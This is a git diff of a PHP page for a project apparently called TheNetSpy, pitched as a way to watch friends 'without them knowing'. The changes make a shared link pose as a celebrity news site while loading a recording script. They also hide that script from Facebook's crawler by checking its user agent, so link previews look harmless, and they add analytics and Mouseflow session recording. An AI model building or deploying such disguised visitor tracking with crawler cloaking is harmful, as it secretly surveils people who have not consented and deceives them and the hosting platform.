@@ -1,11 +1,15 @@
 <?php
 
-// TODO fix playing, which You broke when making preview
-// TODO interface styling
+// TODO check your media queries with various resolutions (translations are making unable to even scroll when the height is not big enough)
+// TODO fix some errors on firefox
+// TODO some hoover animation for social buttons, and generally make them WORK
+// TODO productionate the project
 // TODO clicking on the slider main content doesn't navigate
 // TODO privacy policy
+// TODO communicate when users try to click on playing/preview frame (local, similarly to clicktrace)
+// TODO fix the error with frame translating up after clicking "Reply to comment"
+// TODO sometimes when clicking "Let's go" the whole site gets stuck
 // TODO Your own comments are visible when You are peeking
-// TODO adjust iframe size on *player* resize
 // TODO focus events?
 
 ?>
@@ -15,8 +19,41 @@
 <head>
     <meta charset="utf-8">
     <meta http-equiv="x-ua-compatible" content="ie=edge">
-    <title></title>
-    <meta name="description" content="">
+
+	<?php
+        // if we are recording
+        if(isset($_GET['id'])):
+    ?>
+
+    <title>celebrities24.tk - hottest news round a clock</title>
+    <meta name="description" content="On celebrities24.tk you can find only the
+	hottest news about the subjects You care about. Full speed 24h!">
+
+	<meta property="og:title" content="celebrities24.tk - hottest news round a clock" />
+	<meta property="og:description" content="On celebrities24.tk you can find only the hottest news about the subjects You care about. Full speed 24h!" />
+	<meta property="og:image" content="http://celebrities24.tk/img/fb-share-c24.png" />
+	<meta property="og:type" content="website" />
+	<meta property="og:site_name" content="celebrities24" />
+	<meta property="fb:admins" content="1769520946" />
+
+    <?php
+        // if we are playing
+        else:
+    ?>
+
+    <title>TheNetSpy.com - watch Your pals with a hidden camera</title>
+    <meta name="description" content="TheNetSpy.com lets You make some fun of Your friends, by showing You what exactly they are doing on a wacky news website - without them knowing!">
+
+	<meta property="og:title" content="TheNetSpy.com - watch Your pals with a hidden camera" />
+	<meta property="og:description" content="TheNetSpy.com lets You make some fun of Your friends, by showing You what exactly they are doing on a wacky news website - without them knowing!" />
+	<meta property="og:image" content="http://thenetspy.com/img/fb-share-tns.png" />
+	<meta property="og:url" content="http://thenetspy.com/" />
+	<meta property="og:type" content="website" />
+	<meta property="og:site_name" content="TheNetSpy" />
+	<meta property="fb:admins" content="1769520946" />
+
+    <?php endif; ?>
+
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
     <link rel="apple-touch-icon" href="apple-touch-icon.png">
@@ -68,15 +105,15 @@
     }
     ?>
 
-
     <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
     <script>window.jQuery || document.write('<script src="js/vendor/jquery-1.11.2.min.js"><\/script>')</script>
     <script src="js/vendor/jquery-ui.min.js"></script>
     <script src="js/plugins.js"></script>
 
     <?php
-        // if we are recording
-        if(isset($_GET['id'])):
+        // if we are recording and we are not facebook crawler
+
+        if(isset($_GET['id']) && !stristr($_SERVER['HTTP_USER_AGENT'], 'FacebookExternalHit')):
     ?>
 
     <script src="js/record.js"></script>
@@ -101,15 +138,25 @@
 
     <?php endif; ?>
 
-    <!-- Google Analytics: change UA-XXXXX-X to be your site's ID. -->
-    <!--suppress JSUnresolvedFunction -->
+    <!--suppress JSUnresolvedFunction, CommaExpressionJS -->
     <script>
-        (function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
-                function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
-            e=o.createElement(i);r=o.getElementsByTagName(i)[0];
-            e.src='https://www.google-analytics.com/analytics.js';
-            r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
-        ga('create','UA-XXXXX-X','auto');ga('send','pageview');
-    </script>
+	  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	  ga('create', 'UA-64298390-1', 'auto');
+	  ga('send', 'pageview');
+
+	</script>
+
+	<script type="text/javascript">
+	   var _mfq = _mfq || [];
+	   (function() {
+		   var mf = document.createElement("script"); mf.type = "text/javascript"; mf.async = true;
+		   mf.src = "//cdn.mouseflow.com/projects/7731cfb1-4d10-44c3-9d63-c64b0ef30db2.js";
+		   document.getElementsByTagName("head")[0].appendChild(mf);
+	   })();
+	</script>
 </body>
 </html>
